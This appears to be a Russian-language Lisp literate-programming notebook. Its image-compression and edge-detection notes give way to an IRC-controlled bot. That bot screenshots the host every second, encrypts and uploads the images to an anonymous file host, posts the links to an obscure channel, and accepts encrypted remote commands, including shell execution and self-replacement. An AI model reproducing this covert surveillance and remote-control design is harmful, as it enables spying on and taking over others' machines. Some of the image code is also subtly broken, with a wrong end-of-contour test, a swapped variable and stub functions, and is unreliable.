                (progn ;; then - левый верхний угол квадрата 8x8
                  ;; (pin yy1 xx1 0 255 0) ;; ~~~~~~~ GREEN
                  (setf (aref packflag yy3 xx3) 0) ;; set packflag = 0
                  (dotimes (zz channels)           ;; save to packline
                    (setf (aref packline yy3 xx3 zz)
                          (aref img yy1 xx1 zz))))
                (progn ;; else - любая другая точка кроме верхнего левого угла
                  ;; (pin yy1 xx1 0 70 0)  ;; ~~~~~~~ DARK-GREEN
                  ;; (dotimes (zz channels) ;;~~~~~~~~~~~~~~[:::::::::::::]~~~~~
                  ;;   (setf (aref new yy1 xx1 zz)
                  ;;         (aref img yy1 xx1 zz)))
                  (if (not (= 0 (aref packflag yy3 xx3)))
                      ;; цвет в этом квадрате 8*8 уже менялся -
                      ;; нет смысла проверять опять
                      (progn
                        ;; (pin yy1 xx1 0 0 70)  ;; ~~~~~~~ DARK-BLUE
                        )
                      ;; else - цвет ранее не менялся - имеет смысл проверить сейчас
                      ;; отличается ли цвет текущего обрабатываемого пикселя от эталона
                      (progn
                        (dotimes (zz channels)
                          (if (= (aref packline yy3 xx3 zz)
                                 (aref img yy1 xx1 zz))
                              (progn ;; в
                                ;; (pin yy1 xx1 70 0 0)  ;; ~~~~~~~ DARK-RED
                                )
                              ;; else - любой канал не равен -> весь квадрат к черту
                              (progn
                                ;; (pin yy1 xx1 157 157 0) ;; ~~~~~~~ DARK-YELLOW
                                (setf (aref packflag yy3 xx3)
                                      (+ (ash (logand yy1 7) 3)
                                         (logand xx1 7))))))
                        ;; Если мы здесь, то цвет не поменялся после проверки текущего
                        ;; пикселя - тут мы пока не делаем ничего
                        (progn nil)
                        ))))) ;; end of internal-loop
          ) ;; end of do-cycle for x
        )  ;; end of do-cycle for y
      (values
       packflag packline height width channels bit-depth)))


  (defun re-conv-8x8 (packflag packline height width channels bit-depth &optional old)
    (declare (optimize (speed 3))
             (optimize (safety 0)))
    (let* ((new        (png:make-image height width channels bit-depth)))
      ;; Это отладочная часть, чтобы посмотреть на результаты компактификации
      ;; Она восстанавливает информацию из packflag и packline
      (do* ((yy1      0  (+ 1 yy1))
            (yy-8-p   0  (logand yy1 7))
            (yy3      0  (ash yy1 -3)))
           ((>= yy1 height))
        (declare (type fixnum yy1) (type fixnum yy-8-p) (type fixnum yy3))
        (do* ((xx1      0  (+ 1 xx1))
              (xx-8-p   0  (logand xx1 7))
              (xx3      0  (ash xx1 -3)))
             ((>= xx1 width))
          (declare (type fixnum xx1) (type fixnum xx-8-p) (type fixnum xx3))
          (let* ((packflag (aref packflag yy3 xx3))
                 (yy4 (ash packflag -3))
                 (xx4 (logand packflag 7)))
            (unless (= 0 packflag) ;; partially block
              (if (null old)
                  (progn ;; filled part
                    (dotimes (zz channels)
                      (setf (aref new yy1 xx1 zz)
                            127
                            ;; (logior #b10000000
                                    ;; (aref packline yy3 xx3 zz)
                                    ;; )
                            )))
                  ;; else
                  (if (and (< yy1 (+ yy4 (logand yy1 -8)))
                           (< xx3 (+ xx4 (logand xx1 -8))))
                      (progn ;; filled part
                        (dotimes (zz channels)
                          (setf (aref new yy1 xx1 zz)
                                127
                                ;; (logior #b10000000
                                ;;         (aref packline yy3 xx3 zz))
                                ))
                        )
                      ;; else - rest part
                      (dotimes (zz channels)
                        (setf (aref new yy1 xx1 zz)
                              (logand 255
                                      ;; we need only 1 bit for channel
                                      (logior #b01111111
                                              (aref old yy1 xx1 zz)))))))))))
      new))


  ;; launcher
  (let* ((img
           (with-open-file
               ;; (input "x-snapshot-true-color-telegram.png" :element-type '(unsigned-byte 8))
               (input "antalya.png" :element-type '(unsigned-byte 8))
             (png:decode input))))
    (multiple-value-bind (packflag packline height width channels bit-depth)
        (conv-8x8 img)
      (let ((new (re-conv-8x8 packflag packline height width channels bit-depth
                              ;; img
                              )))
        (with-open-file
            (output "copy1.png"
                    :element-type '(unsigned-byte 8)
                    :direction :output :if-exists :supersede)
          (png:encode new output)))))
#+END_SRC

* Edge detector

Поиск краев:

- Выберем начальный параметр - точку внутри фигуры, края которой мы хотим найти. Ее цвет должен быть равен цвету тона (Fg) и сверху над ней должна быть точка фона (Bg). Запоминаем эту точку - ~EntryPnt~ и ее же записываем в текущую точку - ~CurPnt~.
- Установим начальное направление движения "вправо" (ToRight). В дальнейшем направление движения будет меняться чтобы обходить фигуру по контуру в направлении по часовой стрелке.
- Попытка подвижения вперед:
  - Если слева по направлению движения есть точка с цветом тона (Fg), то мы должны повернуть направление влево и повторить попытку продвижения вперед.
  - Иначе (слева находится точка фона - Bg):
    - Если впереди по направлению движения есть точка с цветом тона (Fg), то мы можем продвинуться вперед. Продвигаясь вперед мы заталкиваем предыдущую точку в ~Stack~ и делаем следующую по направлению движения точку текущей - ~CurPnt~.
      - После этого мы должны проверить, не совпадает ли новая текущая точка ~CurPnt~ с начальной точкой ~EntryPnt~ - если это так, то мы обошли фигуру и дошли до начальной точки и должны вернуть ~Stack~ и выйти. В противном случае мы пытаемся продвинуться на еще одну точку вперед по направлению движения.
    - Иначе (впереди по направлению движения есть точка с цветом фона (Bg). Мы не можем продвинуться вперед, мы должны повернуть направление движения вправо и повторить попытку продвижения вперед.

#+BEGIN_SRC plantuml :file ./img/rc-edge-detector.png
  start
    :save EntryPoint;
    :set: Direction = ToRight;
    !pragma useVerticalIf on
    (M)
    if ((Fg == leftSide(CurPnt))?) then (yes)
      :set: Direction = rotateLeft(Direction);
      (M)
      detach;
    else (no)
      if ((Fg == forwardSide(CurPnt))?) then (yes)
        :push(Stack, CurPnt);
        :set: CurPnt = moveForward(CurPnt);
        if ((curPnt == EntryPoint)?) then (yes)
          :return Stack;
          stop;
        else (no)
          (M)
          detach;
        endif;
      else (no)
        :set: Direction = rotateRight(Direction);
        (M)
        detach;
      endif;
    endif;
#+END_SRC

#+BEGIN_SRC lisp
  (defun rotate-left (direction)
    (cond ((equal 'to-right direction) 'to-up)
          ((equal 'to-up direction) 'to-left)
          ((equal 'to-left direction) 'to-down)
          ((equal 'to-down direction) 'to-right)))

  (defun rotate-right (direction)
    (cond ((equal 'to-right direction) 'to-down)
          ((equal 'to-up direction) 'to-right)
          ((equal 'to-left direction) 'to-up)
          ((equal 'to-down direction) 'to-left)))

  ;; Y-координата идет в CUR-PNT первой
  ;; -1 means to low
  ;; -2 means to high
  (defun forward-side (cur-pnt direction height width)
    (destructuring-bind (yy . xx)
        cur-pnt
      (destructuring-bind (yyy . xxx)
          (cond ((equal 'to-right direction)
                 (cons yy (+ xx 1)))
                ((equal 'to-up direction)
                 (cons (- yy 1) xx))
                ((equal 'to-left direction)
                 (cons yy (- xx 1)))
                ((equal 'to-down direction)
                 (cons (+ yy 1) xx)))
        (when (< yyy 0)
          (setf yyy -1))
        (when (< xxx 0)
          (setf xxx -1))
        (when (> yyy height)
          (setf yyy -2))
        (when (> xxx width)
          (setf yyy -2))
        (cons yyy xxx))))

  ;; (forward-side-pnt-coords (cons 202 3) 'to-down 200 300)

  (defun fg-p (cur-pnt packflag)
    (destructuring-bind (yy . xx)
        cur-pnt
      (and (> yy 0)
           (> xx 0)
           (not (= 0 (aref packflag yy xx)))
           t)))

  (defun left-side (cur-pnt direction height width)
    (forward-side cur-pnt (rotate-left direction) height width))

  (defun edge-8x8 (cur-pnt height width packflag)
    (let ((entry-point cur-pnt)        ;; сохраняем начальную точку
          (stack '())                  ;; создаем пустой стек
          (direction 'to-right))       ;; задаем начальное направление
      (tagbody
       move
         (if (fg-p (left-side cur-pnt direction height width) packflag)
             (progn ;; then fg == left-side
               (setf direction (rotate-left direction))
               (go move))
             (progn ;; else bg == left-side
               (if (fg-p (forward-side cur-pnt direction height width) packflag)
                   (progn ;; then fg == forward-side
                     (push cur-pnt stack)
                     (setf cur-pnt (forward-side cur-pnt direction height width))
                     (if (and (car cur-pnt) (car entry-point)
                              (cdr cur-pnt) (cdr entry-point))
                         (return-from edge-8x8 stack)
                         ;; else
                         (go move)))
                   (progn ;; else
                     (setf direction (rotate-right direction))
                     (go move))))))))
#+END_SRC

* Cutting

Можно ли автоматически сгенерировать по этой картинке программу на форте, которая будет форкаться для того чтобы как можно быстрее воспроизвести в точности такое изображение?

Имея на входе "точки затравки" и поток байт, который управляет в каком направлении будут расти серые участки?

Я думаю о том чтобы включить в виртуальную форт-машину команды fork и exit

И над алгоритмом, который оптимальным способом построит программу для построение картинки

Еще я думаю о том, что при выполнении таких форкнутых программ мы фактически получаем ветвящееся дерево стеков, а вот входные данные - это единый поток команд для всех форкнутых кусков, просто они делают из него выборку команд каждый в своем слайсе, пока не наткнуться на exit

#+BEGIN_SRC lisp :tangle tmp2.lisp
  ;; DBG & PROFILING

  (copy-png "x-snapshot-true-color-telegram.png" "copy.png")

  (compile 'copy-png)

  (dotimes (aa 100)
    (time
     (copy-png "x-snapshot-true-color.png" "aaaaa.png")
     ))

  ;; (disassemble #'copy-png)

  ;; (require :sb-sprof)

  ;; (sb-sprof:profile-call-counts "CL-USER")

  (sb-sprof:with-profiling (:max-samples 100
                            :report :flat
                            :mode :time
                            :loop t)
    (copy-png "x-snapshot-true-color.png" "aaaaa.png"))

  ;; (sb-sprof:with-profiling (:max-samples 100
  ;;                           :mode :alloc
  ;;                           :report :flat)
  ;;   (copy-png "x-snapshot-true-color.png" "aaaaa.png"))
#+END_SRC

* Figures

У меня есть некоторая битовая матрица полученная из изображения текста. Там где были буквы - теперь битовые единицы, там где был фон - битовые нули.

Я вижу, что битовые единицы в среднем образуют замкнутые фигуры, вытянутые в горизонтальном направлении. Они похожи на серию кирпичей в стене, как если бы кто-то пытался закрасить только те кирпичи, на которых были написаны слова. Где между слов были пробелы, там кирпичи остались незакрашенными.

Я хочу построить алгоритм, который анализирует эту битовую матрицу и составляет минимальное по размеру описание этих фигур. Этого описания должно быть достаточно, чтобы воспроизвести фигуру по нему.

Если для каждой фигуры передавать только те точки, которые ее ограничивают, тогда по этим точка границ, мы можем позже залить внутренность фигуры и таким образом воссоздать ее.

При сканировании матрицы точек, когда мы встречаем единичный бит, это значит мы обнаружили край фигуры - это начальная точка. Теперь мы можем следовать вдоль ее границы, т.е. выбирать следующую точку так, чтобы нулевой бит был "с той же стороны" что и у предыдущей. У нас не такой большой выбор: по отношению к предыдущей посещенной точке новая точка может быть слева, справа, спереди или (если мы зашли в тупик) сзади. Для этих четырех вариантов нам нужно только два бита на шаг. Алгоритм может предпочитать всегда левый поворот, если он возможен. Тогда слева от текущей точки всегда будут нулевые биты, а справа единичные.

Для выпуклой фигуры мы должны в конце концов дойти до начальной точки и считать, что фигура найдена. Если попытаться ее залить и сравнить с исходной матрицей, то в случае полного совпадения мы имеем выпуклую фигуру и внутри нее нет нулевых точек.

На каждом шаге движения по границе алгоритм может выдавать в выходной поток два бита, которые определяют был ли поворот: "00" для движения в том же направлении, "11" для разворота и шага назад, "10" для поворота и шага налево, "01" для поворота и шага направо. По начальной координате и этому потоку бит можно восстановить всю фигуру.

Так как фигуры в основном выпуклые и вытянутые по горизонтали, чаще всего будет происходить движение прямо и  соответствующая последовательность нулей может быть эффективно сжата впоследствии.

Фигуры почти всегда были бы вытянутыми прямоугольниками, если бы не буквы, написание которых выдается за пределы строки вниз - "q p g", или вверх "d l".

Если две строчки находятся одна под другой и в верхней строчке была буква с нижним подстрочным элементом, такая как "q" а в верхней строчке - с верхним надострочным элементом, такая как "d" - они могли соприкоснуться, и вместо двух раздельных прямоугольников мы получаем одну фигуру из двух прямоугольников но связанных перемычкой (или несколькими). Причем эти перемычки могут быть достаточно толстыми.

Как их можно разделить?

#+BEGIN_SRC lisp
  (defun bitmap-parser (matrix start-point)
    (let ((curr-point start-point)
          (result-string ""))
      ;; Go through each point in the matrix
      (dolist (row matrix)
        (dolist (point row)
          ;; If the current point is 1
          (if (= 1 point)
              (let ((prev-point (previous-point matrix curr-point)))
                ;; Generate a 2-bit string based on the relative positions
                ;; of the current and previous points
                (cond
                  ((= curr-point prev-point)
                   (setf result-string
                         (concatenate 'string result-string "00")))
                  ((adjacent-points-same-direction? curr-point prev-point)
                   (setf result-string
                         (concatenate 'string result-string "10")))
                  (t (setf result-string
                           (concatenate 'string result-string "01"))))
                ;; Check for end of figure
                (when (end-of-figure? matrix curr-point start-point)
                  (return result-string))))
          ;; Set current point to the next one
          (setf curr-point (next-point matrix curr-point))))))

  ;; Helper functions to find the next/previous point and check if two
  ;; points are adjacent in a certain direction
  (defun next-point (matrix coords) ...)
  (defun previous-point (matrix coords) ...)
  (defun adjacent-points-same-direction? (a b) ...)
  (defun end-of-figure? (matrix curr-point start-point) ...)
#+END_SRC

* TODO Ideas

Несколько серверов могут делать лонг-пуллинг для множества клиентов

* TODO TMP

- Получение и обработка изображения
  - Выделение строк в тексте
  - Деление блока по вертикальным белым просветам
    - Вертикальная проекция - просто посмотреть сколько белых пикселей в каждой строчке и найти белые просветы в этих проекциях; все что находится между этими белыми просветами - это строчки
    - Горизонтальная проекция сегментирует слова (широкие просветы) и символы (узкие просветы)
    - OverSegmetation - строим структуру "граф линейного деления" - набор гипотез где могут быть отдельные символы - для каждого ребра этого графа нужно произвести символьное распознавание, в итоговом графе найти наилучший путь, опираясь на результаты распознавание отдельных символов и какую-то контекстную информацию.
    - Выбор в пайплайне - задача для обучения с подкреплением.
- Анализ структуры страницы
- Распознавание текста
- Синтез документа из распознаных фрагментов
- Сохранение в нужном формате

Структура сети (LSTM):
- Сверточный блок (CNN) - извлекает последовательность визуальных признаков
- Рекуррентный блок  (RNN) - делает предсказания символов

SegLink - Segmens and Link:
- Сегменты - это квадратные участки изображения
- Те сегменты что лежат внутри одного бокса (они в одном слове) мы соединяем линками - это ребро графа
- Сеть предсказывает эти сегменты и линки.
- Работать на нескольких масштабах - 64*64, 32*32, тогда добавляются линки между сегментами разных масштабов
- Кластеризация segments через links с помощью нахождения компонентов связности через dfs
- Segments из одного кластера используют для построения итогового bbox-a

Восстановление ошибок распознавание по словарю

Извлечение смысла с chatGPT и классификаторами

#+NAME: min
#+BEGIN_SRC lisp :tangle ./src/tmp.lisp :noweb yes :exports code
  <<min>>

  <<queue>>

  <<task>>

  <<x_snapshot>>

  ;; (x-snapshot :path "x-snapshot-true-color.png")
#+END_SRC

* TODO Terminating lazy threads

The second thing suspicious to ~PHOENIX~ is when the thread under investigation does not do its job. There may be one or more incoming queues associated with each thread. If there are too many messages piled up in the inbox, this is a reason to kill:

#+NAME: rule_of_killing_threads_by_queue_overflow
#+BEGIN_SRC lisp
  (alexandria:named-lambda rule-of-killing-threads-by-queue-overflow ()
    (let ((thread-structs (get-all-threads)))
      (loop for suspicious in thread-structs :do
        (let ((max-queue-size 30))
          (if (< max-queue-size (thread-queue-size suspicious))
              (kill-thread suspicious))))))
#+END_SRC

There can be many more such rules. Not all of them are born to kill. For example, this rule will create a thread named "irc-conn" if no such thread already exists:

#+NAME: rule_of_born_irc_conn_threads
#+BEGIN_SRC lisp
  (alexandria:named-lambda rule-of-born-irc-conn-threads ()
    (let ((thread-structs (get-all-threads)))
      (lambda (thread-structs)
        (let ((irc-conn-thread (find-thread "irc-conn")))
          (make-irc-conn-thread)))))
#+END_SRC

Now that we have the rules, it is enough to call them one after another. Just for convenience, I moved outside the auxiliary functions that the rules need:

#+NAME: phoenix_processor_of_rules
#+BEGIN_SRC lisp :noweb yes :exports code
  (labels ((get-all-threads ()
             nil)
           (how-many-times-have-i-seen-you ()
             nil)
           (kill-thread ()
             nil)
           (thread-queue-size ()
             nil)
           (find-thread (name)
             nil)
           (make-irc-conn-thread ()
             nil))
    (let ((rules
            (list
             <<rule_of_killing_threads_by_time>>
             <<rule_of_killing_threads_by_queue_overflow>>
             <<rule_of_born_irc_conn_threads>>)))
      (loop for rule in rules do
        (funcall rule))))
#+END_SRC

To avoid race conditions, it is necessary to use thread-operations-lock


#+NAME: phoenix
#+BEGIN_SRC lisp :tangle ./src/max.lisp :noweb yes :exports code
  (defparameter *thread-operations-lock*
    (bt:make-recursive-lock "thread-operations-lock"))

  (defparameter *phoenix*
    (lambda ()
      <<phoenix_processor_of_rules>>
      ))
#+END_SRC

The rest of the logic of the work will be encapsulated in the correct order of rules. We will consider it in the next sections, but for now we will limit ourselves to the diagram:




[TODO:gmm] -=HERE=- ----------------------------------------


Мы хотим создать надежную систему, но подключение к интернету может быть ненадежным, к тому же нет уверенности в том, что все ошибки, которые могут возникнуть, будут корректно перехвачены.

Поэтому мы сделаем супервизор, который будет перезапускать потоки, в которых будет происходить основная работа. Если у потока возникнут проблемы - супервизор отследит это и перезапустит поток.

Чтобы иметь возможность изменять супервизор на лету, мы оформим его как лямбду в глобальной переменной, которую будет вызывать функция ~supervisor-loop~.

Мы также используем флаги, размещенные в глобальных переменных, чтобы супервизор мог принудительно завершать потоки. Если что-то пойдет не так то поток может, например, перезапустить себя, выставив нужный флаг.

Каждую секунду супервизор инкрементирует состояние переменной ~watchdog-timer~. Если поток завис и не сбрасывает эту переменную в ноль - супервизор принудительно завершает поток, что приводит к его перезапуску.

Если соединение с irc-сервером установлено (о чем свидетельствует ~connection-established-flag~) то супервизор должен запускать новый поток репортинга каждую секунду. Задача этого потока - сделать скриншот экрана, поместить в png-файл, зашифровать его, загрузить на файлообменник и послать полученную ссылку в чат. После выполнения задачи поток должен завершиться. Это не обязательно произойдет - он может зависнуть из-за ошибки или просто слишком долго работать. Поэтому супервизор отслеживает количество таких потоков и если их становится больше чем ~max-shot-thread-cnt~ удаляет те, которые работают слишком долго.

[TODO:gmm] Возможно, эта модель не требуется, т.к. нам не нужно создавать по отдельному потоку для скриншотинга каждую секунду. Т.е. мы вполне можем обойтись только контролем зависания одного потока, в котором работает цикл приема сообщений.

#+NAME: supervisor
#+BEGIN_SRC lisp :noweb yes :exports none
  <<debug>>

  (defparameter *max-diffs-cnt* 4)

  (defparameter *sleep-interval* 3)

  (defparameter *watchdog-timer* 0)

  (defparameter *watchdog-timer-max* 100)

  (defparameter *supervisor-stop-flag* nil)

  (defparameter *irc-th-stop-flag* nil)

  (defparameter *shot-th-stop-flag* nil)

  (defparameter *connection-established-flag* nil)

  (defparameter *shot-threads* nil)

  (defparameter *max-shot-thread-life-time* 5)

  (defparameter *max-shot-thread-cnt* 5)

  (defparameter *thread-operations-lock*
    (bt:make-recursive-lock "thread-operations-lock"))

  ;; irc
  <<irc>>

  ;; update
  <<update>>

  ;; shot
  <<shot>>

  ;; upload_code
  <<upload_code>>

  ;; replace_yourself
  <<replace_yourself>>

  ;; remote_gui
  <<remote_gui>>

  ;; shell_command
  <<shell_command>>

  (defparameter *supervisor*
    (lambda ()
      (let ((all-threads (mapcar #'(lambda (th)  (cons (bt:thread-name th) th))
                                 (bt:all-threads))))
        (labels ((fnd (name) (loop :for (nm . th) :in all-threads
                                :do (when (equal name nm)  (return th))))
                 (kill (th)  (handler-case (bt:destroy-thread th)
                               ;; happens, when thread destroyed already
                               (TYPE-ERROR () nil)))
                 (kill-irc (th)
                   (kill th)
                   (setf *watchdog-timer* 0)
                   (setf *connection-established-flag* nil))
                 (clear ()
                   (bt:with-recursive-lock-held (*thread-operations-lock*)
                     (setf *shot-threads*
                           (remove-if-not #'(lambda (pair)
                                              (bt:thread-alive-p (car pair)))
                                          ,*shot-threads*)))))
          ;; if there is no irs-thread then start it
          (when (and (null (fnd "irc-th"))       ;; no irc-th
                     (null *irc-th-stop-flag*))  ;; no irc-th stop flag
            (dbg "::supervisor lambda: start irc-th~%")
            (setf *watchdog-timer* 0)
            (bt:make-thread
             #'irc :name "irc-th"
             :initial-bindings
             `((*standard-output* . ,*standard-output*)
               (*irc-thread-stop-flag* . ,*irc-th-stop-flag*))))
          ;; if there is irc-thread, but the watchdog-timer exceeds
          ;; or the flag is set - then kill it.
          (awhen (fnd "irc-th")
            (when (> *watchdog-timer*  *watchdog-timer-max*)
              (dbg "::supervisor-lambda: kill irc-th by WDG~%")
              (kill-irc it))
            (when *irc-th-stop-flag*
              (dbg "::supervisor-lambda: kill irc-th by FLAG~%")
              (kill-irc it)))
          ;; kill latecomers shot-threads if there are too many
          ;; TODO: debug it!
          (when (> (length *shot-threads*) *max-shot-thread-cnt*)
            (dbg "::supervisor-lambda: many threads~%")
            (loop :for (shot-th . time) :in *shot-threads* :do
                 (dbg "~A . ~A~%" shot-th time)
                 (when (> (- (get-universal-time) time)
                          ,*max-shot-thread-life-time*)
                   (dbg "::supervisor-lambda: kill shot-th by lifetime exceed~%")
                   (kill shot-th)))
            (clear))
          ;; start new shot-thread (every second when connection-established)
          (clear)
          (when *connection-established-flag*
            (let ((bindings `((*standard-output* . ,*standard-output*)
                              (*shot-th-stop-flag* . ,*shot-th-stop-flag*)
                              (*irc-sess* . ,*irc-sess*)
                              (*irc-user* . ,*irc-user*)
                              (*irc-serv* . ,*irc-serv*)
                              (*irc-chan* . ,*irc-chan*)
                              (*irc-lock* . ,*irc-lock*)
                              (*irc-conn* . ,*irc-conn*)
                              (*watchdog-timer* . ,*watchdog-timer*))))
              (bt:with-recursive-lock-held (*thread-operations-lock*)
                (push (cons (bt:make-thread #'shot :name "shot-th"
                                            :initial-bindings bindings)
                            (get-universal-time))
                      ,*shot-threads*))))))))

  (defun supervisor-loop ()
    (setf *watchdog-timer* 0)
    (tagbody
     infinite
       (when *supervisor-stop-flag*
         (go end))
       (dbg "::supervisor-loop WDG=~3,'0D~%" *watchdog-timer*)
       (funcall *supervisor*)
       (sleep *sleep-interval*)
       (incf *watchdog-timer*)
       (go infinite)
     end))

  (supervisor-loop)
#+END_SRC

Ниже - диаграмма работы супервизора с остальными компонентами

#+BEGIN_SRC plantuml :file ./img/survey-01.png
  participant Supervisor
  participant Shot_Thread
  participant Irc_Thread
  participant Irc_Helper
  participant Irc_Server
  hide footbox
  create Irc_Thread
  Supervisor -> Irc_Thread : make_thread
  Supervisor -> Supervisor : wait for **CONNECTION_ESTABLISHED_FLAG**
  Irc_Thread -> Irc_Server : connect
  Irc_Server -> Irc_Thread : ok

  group Irc_Loop
    create Irc_Helper
    Irc_Thread   -> Irc_Helper : make_thread
    Irc_Thread -> Irc_Thread : read_message_loop
    activate Irc_Helper
    note right Irc_Helper
      add_hook **IRC_MSG_HOOK**
      join to channel
      send presence
      set **CONNECTION_ESTABLISHED_FLAG**
    end note
    Irc_Helper --> Irc_Helper :
    destroy Irc_Helper
	end

  Irc_Thread --> Irc_Thread : IRC_MSG_HOOK
  Irc_Thread --> Irc_Thread : IRC_MSG_HOOK
  Irc_Thread --> Irc_Thread : IRC_MSG_HOOK

  group When **CONNECTION_ESTABLISHED_FLAG**
    create Shot_Thread
    Supervisor -> Shot_Thread : make_thread
    activate Shot_Thread

    note over Shot_Thread
      x_snapshot
      pack_img
    end note

    group Wrap_Img
      note over Shot_Thread
        encrypt
        anon-file-upload
        sendmsg
      end note
    end

    Shot_Thread --> Shot_Thread :
    destroy Shot_Thread
	end
#+END_SRC

#+results:
[[file:./img/survey-01.png]]

[[file:./img/survey-01.png]]

* Channel Name

Мы будем использовать разные irc-каналы для коммуникации с разными абонентами - так их проще отлаживать по отдельности.

Для этого создадим функцию, которая будет определять имя канала при tangling-e

#+NAME: get_irc_channel_name
#+BEGIN_SRC elisp
  "nvrtlessfndout"
#+END_SRC

  "wntriscoming"

* File Destionation

Таким же образом мы будем танглить путь для сохранения файлов

#+NAME: get_dest_path
#+BEGIN_SRC elisp
  "tan"
#+END_SRC

  "wnt"
* Irc

Работа с IRC состоит из нескольких этапов
- Подключение
- Запуск цикла чтения сообщений
- Установка хука, чтобы перехватить сообщения-команды
- Подключение к каналу и отправка первого сообщения

После этого мы можем отпралять сообщения в канал, а когда другие сообщения будут приходить наш хук будет выполнен.

** Connect

Начнем с подключения к IRC - нашему коммуникационному каналу.

Если нет подключения к сети мы получим ошибку ~USOCKET:NS-TRY-AGAIN-CONDITION~, которая будет проигнорирована, но записана в лог, как и любые другие ошибки подключения. В этих случаях функция ~irc-loop~ не будет вызвана, произойдет выход их функции потока и поток будет завершен. Обнаружив отсутствие потока супервизор перезапустит его и это приведет к следующей попытке подключения.

Если подключение произошло успешно - мы вызываем ~irc-loop~.

#+NAME: irc
#+BEGIN_SRC lisp :noweb yes
  (defparameter *irc-sess* nil) ;; (get-universal-time)
  (defparameter *irc-user* nil) ;; (format nil "b~A" *irc-sess*)
  (defparameter *irc-serv* "irc.freenode.org")
  (defparameter *irc-chan* "#<<get_irc_channel_name()>>")
  (defparameter *irc-lock* (bt:make-recursive-lock "irc-lock"))
  (defparameter *irc-conn* nil)

  <<irc_loop>>

  (defun irc ()
    "irc thread func"
    (setf *irc-sess* (get-universal-time))
    (setf *irc-user* (format nil "b~A" *irc-sess*))
    (setf *irc-conn*
          (handler-case
              (cl-irc:connect :nickname *irc-user* :server *irc-serv*)
            (USOCKET:NS-TRY-AGAIN-CONDITION (err)
              (dbg "::irc connect error: ~A~%" (type-of err))
              nil)
            (t (err)
              (dbg "::irc connect error: ~A~%" (type-of err))
              nil)))
    (when *irc-conn*
      (dbg "::irc conn:~A~%" *irc-conn*)
      (setf *watchdog-timer* 0)
      (irc-loop)))
#+END_SRC

** Read loop

После успешного подключения мы запускаем цикл чтения сообщений из коммуникационного канала. В случае успеха этот поток будет зациклен в нем, поэтому здесь мы должны запустить вспомогательный поток ~irc-helper~, который установит нужные хуки

При временном отключении интернета внутри ~CL-IRC:READ-MESSAGE-LOOP~ может возникнуть ошибка ~SB-INT:SIMPLE-STREAM-ERROR~ с сообщением вида couldn't read from #<SB-SYS:FD-STREAM for "socket 192.168.0.102:50644, peer: 149.56.134.238:6667" {1008002283}>: Connection reset by peer

В этом случае нужно сделать реконнект. Чтобы его осуществить мы просто игнорируем ошибку, выведя её в лог и возвращая NIL. Это приводит к выходу из функции потока и супервизор запустит поток снова на следующем шаге.

Я временно отключил игнорирование ошибок, чтобы поймать их, если они произойдут. По идее все возможные ошибки перехватываются в местах их возникновения, если это не так - я увижу это, т.к. игнор отключен.

#+NAME: irc_loop
#+BEGIN_SRC lisp :noweb yes
  <<irc_helper>>

  (defun irc-loop ()
    (bt:make-thread
     #'irc-helper :name "irc-helper-th"
     :initial-bindings
     `((*standard-output* . ,*standard-output*)
       (*irc-sess* . ,*irc-sess*)
       (*irc-user* . ,*irc-user*)
       (*irc-serv* . ,*irc-serv*)
       (*irc-chan* . ,*irc-chan*)
       (*irc-lock* . ,*irc-lock*)
       (*irc-conn* . ,*irc-conn*)))
    (handler-case (cl-irc:read-message-loop *irc-conn*)
      (SB-INT:SIMPLE-STREAM-ERROR (err)
        (dbg "::irc-loop error: ~A~%" (type-of err)))
      ;; (t (err)
      ;;   (dbg "::irc-loop error: ~A~%" (type-of err)))
      ))
#+END_SRC

** Irc helper

После того как мы запустили цикл чтения сообщений следует подождать немного, чтобы успели дойти приветственные сообщения канала.

Мы устанавливаем хук чтобы перехватить приход сообщений и подключаемся к каналу.

После этого мы считаем, что соединение корректно установлено, о чем сигнализируем установкой флага *connection-established-flag*

После этого можно отправить сообщение о присутствии.

Затем поток завершается - свою задачу он выполнил.

[TODO:gmm] По-видимому, вероятна ситуация, когда пропадает коннект в момент передачи сообщения в канал. В этом случае поток застревает в блокировке, не давая ее взять другим потокам. Я добавил ~recursive-lock~, но этого недостаточно. Полагаю, необходимо применение таймаутов на блокировку, но пока не могу придумать модельную ситуацию чтобы проверить это.

#+NAME: irc_helper
#+BEGIN_SRC lisp :noweb yes
  (defmacro sendmsg (msg &rest params)
    `(bt:with-recursive-lock-held (*irc-lock*)
       (handler-case
           (cl-irc:privmsg *irc-conn* *irc-chan* (format nil ,msg ,@params))
         (t (err)
           (dbg "::irc connect error: ~A~%" (type-of err))
           nil))))

  ;; irc-hook
  <<irc_hook>>

  (defun irc-helper ()
    (sleep 1)
    (cl-irc:add-hook *irc-conn* 'cl-irc:IRC-PRIVMSG-MESSAGE #'irc-msg-hook)
    (sleep 1)
    (bt:with-recursive-lock-held (*irc-lock*)
      (cl-irc:join *irc-conn* *irc-chan*))
    (sleep 1)
    (bt:with-recursive-lock-held (*irc-lock*)
      (setf *connection-established-flag* t))
    (sendmsg "hi"))
#+END_SRC

** Command hook

Определим функцию, которая будет обрабатывать сообщения, получаемые из irc-канала. Она должна возвращать T чтобы предотвратить дальнейшую обработку принятого сообщения.

#+NAME: irc_hook
#+BEGIN_SRC lisp :noweb yes
  ;; irc_cmd_proc
  <<irc_cmd_proc>>

  (defun irc-msg-hook (param)
    "MUST return T for stop hooks processing"
    (funcall *irc-cmd* param)
    (setf *watchdog-timer* 0)
    t)
#+END_SRC

У сообщения есть следующие поля:
- CL-IRC:SOURCE
- CL-IRC:USER
- CL-IRC:HOST
- CL-IRC:COMMAND
- CL-IRC:ARGUMENTS
- CL-IRC:CONNECTION
- CL-IRC:RECEIVED-TIME
- CL-IRC:RAW-MESSAGE-STRING

Из них нас интересует собственно команда размещенная в ~ARGUMENTS~. Мы прогоняем ее через функцию ~decode~, которая регуляркой разбивает команду на контрольную сумму (CRC32) и base64-кодированный код. Код расшифровывается с помощью ~decrypt~ и текущего ~seed~ а затем по нему вычисляется контрольная сумма. Если переданная контрольная сумма совпала с вычисленной - эта команда адресована нам, и мы ее выполняем.

#+NAME: irc_cmd_proc
#+BEGIN_SRC lisp :noweb yes
  ;; seq_xor
  <<seq_xor>>

  ;; ecrypt
  <<encrypt>>

  ;; decrypt
  <<decrypt>>

  ;; encode
  <<encode>>

  ;; decode
  <<decode>>

  (defparameter *irc-cmd*
    (lambda (param)
      (block irc-cmd-block
        (let* ((msg (cadr (CL-IRC:ARGUMENTS param)))
               (cmd (decode msg *irc-sess*)))
          (dbg "::MSG: [~A]~%" msg)
          (dbg "::CMD: [~A]~%" cmd)
          (finish-output)
          (unless (null cmd)
            (setf *watchdog-timer* 0)
